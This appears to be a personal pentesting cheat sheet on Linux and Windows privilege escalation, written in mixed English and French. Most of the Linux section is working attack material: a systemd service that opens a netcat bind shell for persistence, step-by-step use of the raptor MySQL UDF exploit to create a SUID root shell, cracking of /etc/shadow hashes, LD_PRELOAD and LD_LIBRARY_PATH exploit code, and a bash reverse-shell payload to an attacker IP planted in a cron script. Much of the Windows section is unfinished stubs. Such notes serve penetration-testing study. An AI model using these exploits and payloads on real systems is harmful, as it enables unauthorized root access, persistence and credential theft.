---
title: "Privilege Escalation"
---

<p style="text-align: right">_- last update 09/08/2022 -_</p>

## Tools

* [AutoSUID](https://github.com/IvanGlinkin/AutoSUID): automate harvesting the SUID executable files and to find a way for further escalating the privileges.

## On linux

Look at the current user and it's rights : `id`

Look for the sudo rights, maybe a command can be abused : `sudo -l`

### Detect environment

Search for a `/.dockerenv` file to know if you are in a container.

### SUID

The [AutoSUID](https://github.com/IvanGlinkin/AutoSUID) tool is automating the following process.

The following oneliner is listing every file with SGID or SUID flag enabled, ignoring errors and outputing resutis in a file.

```bash
# version simple
find / -perm -u=s -type f 2>/dev/null

# version un peu plus compliquée
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee suid_sgid_files.txt
```

Command details

```txt
find \                # lister tout les fichiers
  / \                 # depuis la racine
  -perm -4000 \       # qui ont le bit SUID d'activer
  -o \                # OU (-or)
  -perm -2000 \       # le bit SGID d'activé
  -exec ls -ldb {} \; # pour chaque fichier, afficher en uilisant la commande ls
```

Once you have this binary list, you can search for a way to escalate privileges from [GTFOBins](https://gtfobins.github.io/) website.

### Systemctl

If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance.

```systemd
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
[Install]
WantedBy=multi-user.target
```

### Mysql UDF

If

* mysql is installed as root
* "root" user for the service does not have a password assigned

Then you can install a "User Defined Function" (UDF) to run system commands as
root.

Download [the raptor udf2 exploit](https://www.exploit-db.com/exploits/1518)

```bash
curl -o raptor_udf2.c "https://www.exploit-db.com/download/1518"
```

Compile it

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect mysql as root user

```bash
mysql -u root
```

Install the UDF

```mysql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to privesc (here copy a root shell with suid)

```mysql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Then enter the shell

```bash
/tmp/rootbash -p
```

### Readable shadow file

If `/etc/shadow` and `/etc/passwd` files are readable, get them locally.

Unshadow the result

```bash
unshadow passwd shadow > unshadowed.txt
```

Keep only the hashes

```bash
cut -d ':' -f 2 unshadowed.txt | tee hashes.txt
```

Break with john (find format in [hashcat examples](https://hashcat.net/wiki/doku.php?id=example_hashes)).

```bash
john --wordlist=rockyou.txt hashes.txt
```

( _WARNING: the `=` character is mandatory in arguments !!!_ )

### Writable shadow file

If `/etc/shadow` is writable, you can change a user's password.

```bash
mkpasswd -m sha-512 $PASSWORD
```

### Missing GTFOBins

If Apache2 can run as root, we can read the first line of any file. For exemple,
outputing the root hash of shadow file.

```bash
sudo apache2 -f /etc/shadow
```

### Exploiting sudo's LD_PRELOAD inheritance

Verify that sudo inherit the `LD_PRELOAD` variable

```bash
sudo -l | grep env_keep
```

Here is a simple exploit (called `preload.c`)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Build this exploit

```bash
gcc -nostartfiles -shared -fPIC -o /tmp/preload.so preload.c
```

Run one of the allowed programs showed by `sudo -l` with the preload object.

```bash
sudo LD_PRELOAD=/tmp/preload.so $SUDOABLEPROGRAM
```

This should give you instantly a root shell.

### Exploiting sudo's LD_LIBRARY_PATH inheritance

Verify that sudo inherit the `LD_LIBRARY_PATH` variable

```bash
sudo -l | grep env_keep
```

Here is a simple exploit you can call `library_path.c`

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Identify a library that your vulnerable program (one of `sudo -l`) is using

```bash
ldd $(which $SUDOABLEPROGRAM)
```

Impersonate the targeted library with your exploit

```bash
gcc -o /tmp/libs/$TARGETLIB -shared -fPIC library_path.c
```

Then run the program with your malicious library

```bash
sudo LD_LIBRARY_PATH=/tmp/libs/$TARGETLIB $SUDOABLEPROGRAM
```

### Writable crontab script

If you are able to overwrite a script run by crontab as root.

You can use a common payload

```bash
echo "bash -i >& /dev/tcp/$PIRATEIP/$PIRATEPORT 0>&1" > $VULNERABLESCRIPT
```


## On Windows

### Common Enumeration

Automated: [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

List local users.

```cmd
net users
```

List sensitiv system informations to look for public vulns.

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

List services:

```cmd
wmic service list
```

### Stored Credentials

**SAM (Security Accounts Manager)**: It's a system database that store authentication related data (mdp, hash, ...).

There are 2 types of hash to autenticate users:

* **LM (LAN Manager)**: old, vulnerable to brute-force
* **NTLM (NT LAN Manager)**: modern, robust

**LSASS (Local Security Authority Subsystem Service)**: process that talks to the **SAM** to compare hashes / get mdps.

**LSASS** temporary store passwords in plaintext. To allow kind of an SSO.

You can use [mimikatz](https://github.com/gentilkiwi/mimikatz) to dump **SAM**'s hashes and break them with [John the Ripper](https://www.openwall.com/john/) !

_Incomming (applications storage, configuration files, ...)_

### Windows Kernel Exploits

_Incomming ..._

### Insecure File/Folder Permissions

_Incomming ..._

### Insecure Service Permissions

_Incomming ..._

### DLL Hijacking

_Incomming ..._

### Unquoted Service Path

Il est assez courant de pouvoir remplacer des exe ou d'habuser de chemins
windows. Par exemple voir si on peut renommer des exe qui sont executés
periodiquement par **WindowsScheduler**.

_Incomming ..._

### AlwaysInstallElevated policy

(custom MSI installations)

The InstallerFileTakeOver vulnerability:

* [original github (down)](https://github.com/klinix5/InstallerFileTakeOver)
* [from internet archive](https://archive.org/details/github.com-klinix5-InstallerFileTakeOver_-_2021-11-25_01-39-13)
* [fork](https://github.com/szybnev/cmd32)
* [fork](https://github.com/AlexandrVIvanov/InstallerFileTakeOver)
* [fork](https://github.com/noname1007/InstallerFileTakeOver)

### Vulnerable privileged Software

_Incomming ..._

